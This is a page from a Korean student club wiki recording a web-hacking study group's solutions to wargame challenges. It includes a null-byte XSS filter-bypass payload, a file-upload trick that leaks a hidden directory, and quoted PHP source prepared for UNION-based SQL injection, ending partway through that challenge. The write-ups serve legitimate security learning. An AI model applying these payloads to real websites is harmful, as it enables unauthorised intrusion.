



<!DOCTYPE html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.3, mkdocs-material-2.7.1">
    
    
      
        <title>4주차 ~ 6주차 - S.OWL Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
      
    
    
      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#-4-6" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="S.OWL Wiki" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                S.OWL Wiki
              </span>
              <span class="md-header-nav__topic">
                4주차 ~ 6주차
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  


  <a href="https://github.com/s-owl/wiki/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      s-owl/wiki
    </div>
  </a>

          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </span>
    S.OWL Wiki
  </label>
  
    <div class="md-nav__source">
      


  


  <a href="https://github.com/s-owl/wiki/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      s-owl/wiki
    </div>
  </a>

    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../.." title="S.OWL Wiki" class="md-nav__link">
      S.OWL Wiki
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      S.OWL 운영 관련 문서
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        S.OWL 운영 관련 문서
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../manual/rule/" title="동아리 회칙" class="md-nav__link">
      동아리 회칙
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../manual/admins/" title="S.OWL 운영진 목록" class="md-nav__link">
      S.OWL 운영진 목록
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      S.OWL 활동 핸드북
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        S.OWL 활동 핸드북
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../manual/handbook/" title="Index" class="md-nav__link">
      Index
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../manual/handbook/using-slack/" title="Slack 사용하기" class="md-nav__link">
      Slack 사용하기
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../HowToEdit/" title="위키 수정 가이드" class="md-nav__link">
      위키 수정 가이드
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../blogs/" title="개인 운영 블로그 목록" class="md-nav__link">
      개인 운영 블로그 목록
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      행사 목록
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        행사 목록
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/" title="Index" class="md-nav__link">
      Index
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/ssscon5th/" title="제5회 SSSCON" class="md-nav__link">
      제5회 SSSCON
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/ssscon4th/" title="제4회 SSSCON" class="md-nav__link">
      제4회 SSSCON
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/ssscon3rd/" title="제3회 SSSCON" class="md-nav__link">
      제3회 SSSCON
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/ssscon2nd/" title="제2회 SSSCON" class="md-nav__link">
      제2회 SSSCON
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/softworkshop2016ssstrack/" title="2016년도 소프트웨어공학과 워크샵 SSS 트랙" class="md-nav__link">
      2016년도 소프트웨어공학과 워크샵 SSS 트랙
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../events/ssscon1st/" title="제1회 SSSCON" class="md-nav__link">
      제1회 SSSCON
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6" checked>
    
    <label class="md-nav__link" for="nav-6">
      스터디 목록
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        스터디 목록
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../" title="Index" class="md-nav__link">
      Index
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../django-studies/" title="장고 스터디" class="md-nav__link">
      장고 스터디
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../pybasics1704/" title="파이썬 기초 스터디(2017.04)" class="md-nav__link">
      파이썬 기초 스터디(2017.04)
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../java-studies/" title="java스터디(2017.04)" class="md-nav__link">
      java스터디(2017.04)
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../c_study/" title="C 스터디 2017" class="md-nav__link">
      C 스터디 2017
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../algorithm_study/" title="알고리즘 스터디 (2017.03)" class="md-nav__link">
      알고리즘 스터디 (2017.03)
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../python-basics-study/" title="파이썬 기초 스터디(2017.01)" class="md-nav__link">
      파이썬 기초 스터디(2017.01)
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-8" type="checkbox" id="nav-6-8" checked>
    
    <label class="md-nav__link" for="nav-6-8">
      웹해킹 스터디
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-6-8">
        웹해킹 스터디
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../" title="개요" class="md-nav__link">
      개요
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../webhacking-week1to3/" title="1주차 ~ 3주차" class="md-nav__link">
      1주차 ~ 3주차
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        4주차 ~ 6주차
      </label>
    
    <a href="./" title="4주차 ~ 6주차" class="md-nav__link md-nav__link--active">
      4주차 ~ 6주차
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#4" title="4주차 모임" class="md-nav__link">
    4주차 모임
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#23" title="23번 문제" class="md-nav__link">
    23번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#41" title="41번 문제" class="md-nav__link">
    41번 문제
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5" title="5주차 모임" class="md-nav__link">
    5주차 모임
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#7" title="7번 문제" class="md-nav__link">
    7번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33" title="33번 문제" class="md-nav__link">
    33번 문제
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#33-1" title="33-1" class="md-nav__link">
    33-1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-2" title="33-2" class="md-nav__link">
    33-2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-3" title="33-3" class="md-nav__link">
    33-3
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-4" title="33-4" class="md-nav__link">
    33-4
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-5" title="33-5" class="md-nav__link">
    33-5
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-6" title="33-6" class="md-nav__link">
    33-6
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-7" title="33-7" class="md-nav__link">
    33-7
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-8" title="33-8" class="md-nav__link">
    33-8
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-9" title="33-9" class="md-nav__link">
    33-9
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-10" title="33-10" class="md-nav__link">
    33-10
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#47" title="47번 문제" class="md-nav__link">
    47번 문제
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6" title="6주차 모임" class="md-nav__link">
    6주차 모임
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#5_1" title="5번 문제" class="md-nav__link">
    5번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#34" title="34번 문제" class="md-nav__link">
    34번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#52" title="52번 문제" class="md-nav__link">
    52번 문제
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" title="추가적으로..." class="md-nav__link">
    추가적으로...
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#60" title="60번 문제" class="md-nav__link">
    60번 문제
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../docker-study/" title="Docker Study" class="md-nav__link">
      Docker Study
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      프로젝트 목록
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        프로젝트 목록
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../projects/" title="Index" class="md-nav__link">
      Index
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../projects/2017-07-skhufeeds/" title="SKHUFEEDS" class="md-nav__link">
      SKHUFEEDS
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      면접정보 및 후기
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        면접정보 및 후기
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../interview/" title="Index" class="md-nav__link">
      Index
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../interview/sinchon-severance/" title="신촌 세브란스 병원" class="md-nav__link">
      신촌 세브란스 병원
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../interview/sw-maestro-8th/" title="SW_Maestro 8기 과정설명회 후기" class="md-nav__link">
      SW_Maestro 8기 과정설명회 후기
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      서버
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        서버
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../server/canonical-livepatch/" title="캐노니컬 라이브패치 서비스" class="md-nav__link">
      캐노니컬 라이브패치 서비스
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../server/unattended-upgrades/" title="unattended-upgrades" class="md-nav__link">
      unattended-upgrades
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../letsencrypt/" title="Let's Encrypt" class="md-nav__link">
      Let's Encrypt
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      패키지 관리자
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        패키지 관리자
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../package-manager/choco/" title="Chocolatey" class="md-nav__link">
      Chocolatey
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../package-manager/homebrew/" title="Homebrew" class="md-nav__link">
      Homebrew
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-11" type="checkbox" id="nav-11">
    
    <label class="md-nav__link" for="nav-11">
      기타
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-11">
        기타
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../skhu-forest-with-firefox/" title="(SKHU)불여우와 함께 숲으로 들어가기" class="md-nav__link">
      (SKHU)불여우와 함께 숲으로 들어가기
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#4" title="4주차 모임" class="md-nav__link">
    4주차 모임
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#23" title="23번 문제" class="md-nav__link">
    23번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#41" title="41번 문제" class="md-nav__link">
    41번 문제
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5" title="5주차 모임" class="md-nav__link">
    5주차 모임
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#7" title="7번 문제" class="md-nav__link">
    7번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33" title="33번 문제" class="md-nav__link">
    33번 문제
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#33-1" title="33-1" class="md-nav__link">
    33-1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-2" title="33-2" class="md-nav__link">
    33-2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-3" title="33-3" class="md-nav__link">
    33-3
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-4" title="33-4" class="md-nav__link">
    33-4
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-5" title="33-5" class="md-nav__link">
    33-5
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-6" title="33-6" class="md-nav__link">
    33-6
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-7" title="33-7" class="md-nav__link">
    33-7
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-8" title="33-8" class="md-nav__link">
    33-8
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-9" title="33-9" class="md-nav__link">
    33-9
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#33-10" title="33-10" class="md-nav__link">
    33-10
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#47" title="47번 문제" class="md-nav__link">
    47번 문제
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6" title="6주차 모임" class="md-nav__link">
    6주차 모임
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#5_1" title="5번 문제" class="md-nav__link">
    5번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#34" title="34번 문제" class="md-nav__link">
    34번 문제
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#52" title="52번 문제" class="md-nav__link">
    52번 문제
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" title="추가적으로..." class="md-nav__link">
    추가적으로...
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#60" title="60번 문제" class="md-nav__link">
    60번 문제
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/s-owl/wiki/edit/master/docs/studies/webhacking/webhacking-week4to6.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="-4-6">웹해킹 스터디 - 4주차 ~ 6주차 기록<a class="headerlink" href="#-4-6" title="Permanent link">&para;</a></h1>
<h2 id="4">4주차 모임<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
<ul>
<li>2016.11.21</li>
<li>참석자 : 김지연, 박지선, 한나라, 한영빈</li>
<li>결석 : 송지은(병결)</li>
<li>푼 문제</li>
<li>김지연 : 23</li>
<li>박지선 :</li>
<li>한나라 :</li>
<li>한영빈 :</li>
<li>송지은 : 41</li>
</ul>
<h3 id="23">23번 문제<a class="headerlink" href="#23" title="Permanent link">&para;</a></h3>
<ul>
<li><code>&lt;script&gt;alert(1);&lt;/script&gt;</code>을 인젝션 하는 문제.</li>
<li>특수문자를 입력했을 때 필터링되지 않는다.</li>
<li>"script", "alert", "sc" 등은 필터링된다. (no hack 표시)</li>
<li>"s%00c"을 입력했을 때, 주소창 <code>code=s%2500c</code>로 바뀐다.</li>
<li>주소창에서 25를 지우고 <code>Enter</code> 누르면 "sc" 그대로 인젝션 된다.</li>
<li><code>&lt;script&gt;alert(1);&lt;/script&gt;</code> 을 <code>URL인코딩</code>을 한다.</li>
<li>인코딩을 하면 <code>%3cscript%3ealert(1)%3b%3c%2fscript%3e</code> 값이 나온다.</li>
<li>이 값에 script와 alert 글자 사이에 <code>%00</code>을 써준다. (%00은 공백 Null의 표현)</li>
<li><code>%3cs%00c%00r%00i%00p%00t%3ea%00l%00e%00r%00t(1)%3b%3c%2fs%00c%00r%00i%00p%00t%3e</code></li>
<li>이것을 주소창 <code>code=</code> 뒤에 입력해주면 문제해결.</li>
</ul>
<h3 id="41">41번 문제<a class="headerlink" href="#41" title="Permanent link">&para;</a></h3>
<ul>
<li>"~/index.phps" 에서 소스코드를 확인한다.</li>
<li><code>copy()</code> 함수는 <code>빈칸</code>이 값으로 들어왔을 때 취약점이 발생한다.</li>
<li><code>빈칸</code>이나 <code>.</code>을 파일명으로 입력해주면 <code>eregi()</code> 함수에서 필터링 되어 막힌다.</li>
<li>따라서 <code>eregi()</code> 함수 사용 이후에 적힌 <code>&lt;</code>와 <code>&gt;</code>를 이용한다.</li>
<li>파일명이 <code>&lt;</code> 또는 <code>&gt;</code>인 파일을 업로드하면 에러 메세지가 출력되면서 <code>$hidden_dir</code> 값이 노출된다.</li>
<li>제대로 된 파일을 업로드 한 후 "~/$hidden_dir/업로드한_파일명" 으로 접속하면 문제가 풀린다.</li>
</ul>
<h2 id="5">5주차 모임<a class="headerlink" href="#5" title="Permanent link">&para;</a></h2>
<ul>
<li>2016.11.28</li>
<li>참석자 : 김지연, 박지선, 한영빈, 송지은</li>
<li>결석 : 한나라(병결)</li>
<li>푼 문제</li>
<li>김지연 : 7</li>
<li>박지선 :</li>
<li>한나라 :</li>
<li>한영빈 : 33</li>
<li>송지은 : 47</li>
</ul>
<h3 id="7">7번 문제<a class="headerlink" href="#7" title="Permanent link">&para;</a></h3>
<ul>
<li>URL을 보면 <code>val=1</code> 확인할 수 있다.</li>
<li><code>auth</code>을 클릭하면 <code>Acess_Denied</code>라는 안내창이 나온다.</li>
<li>소스를 보면 주석이 있다.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="c">&lt;!-- admin mode : val=2 --&gt;</span>
<span class="c">&lt;!--</span>
<span class="c">index.phps</span>
<span class="c">--&gt;</span>
</pre></div>

<ul>
<li><code>admin mod</code>는 <code>val = 2</code>라는 것을 알수 있다.</li>
<li>그래서 주소창의 <code>val</code>값을 2로 변경하면</li>
<li><code>Access Denied!</code>라고 나온다.</li>
<li><code>index.phps</code> 이동해본다.</li>
<li>여기에도 주석이 있다. 주석을 통해 정보를 얻을 수 있다.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="c">&lt;!--</span>
<span class="c">db에는 val=2가 존재하지 않습니다.</span>

<span class="c">union을 이용하세요</span>
<span class="c">--&gt;</span>
</pre></div>

<ul>
<li>주석 아래에 있는 소스를 해석해보면</li>
<li>go에 val값을 저장.</li>
<li>if: go값이 없으면 val=1.</li>
<li><code>go</code>값을 <code>ck</code>에 저장.</li>
<li><code>*</code>, <code>,</code>, <code>/</code>의 값을 지움.</li>
<li><code>--</code>, <code>2</code>, <code>substring</code> 등을 사용하지 못하도록 필터링.</li>
<li><code>Space</code> 사용할 수 없음.</li>
<li><code>rand</code>는 난수를 만드는 함수. (난수는 랜덤으로 이해하면 된다.)</li>
<li><code>rand</code>값에는 1~5 사이의 값을 랜덤하게 저장.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="x">$rand=rand(1,5);</span>

<span class="x">if($rand==1)</span>
<span class="x">{</span>
<span class="x">$result=@mysql_query(&quot;select lv from lv1 where lv=($go)&quot;) or die(&quot;nice try!&quot;);</span>
<span class="x">}</span>

<span class="x">if($rand==2)</span>
<span class="x">{</span>
<span class="x">$result=@mysql_query(&quot;select lv from lv1 where lv=(($go))&quot;) or die(&quot;nice try!&quot;);</span>
<span class="x">}</span>

<span class="x">if($rand==3)</span>
<span class="x">{</span>
<span class="x">$result=@mysql_query(&quot;select lv from lv1 where lv=((($go)))&quot;) or die(&quot;nice try!&quot;);</span>
<span class="x">}</span>

<span class="x">if($rand==4)</span>
<span class="x">{</span>
<span class="x">$result=@mysql_query(&quot;select lv from lv1 where lv=(((($go))))&quot;) or die(&quot;nice try!&quot;);</span>
<span class="x">}</span>

<span class="x">if($rand==5)</span>
<span class="x">{</span>
<span class="x">$result=@mysql_query(&quot;select lv from lv1 where lv=((((($go)))))&quot;) or die(&quot;nice try!&quot;);</span>
<span class="x">}</span>

<span class="x">$data=mysql_fetch_array($result);</span>
<span class="x">if(!$data[0]) { echo(&quot;query error&quot;); exit(); }</span>
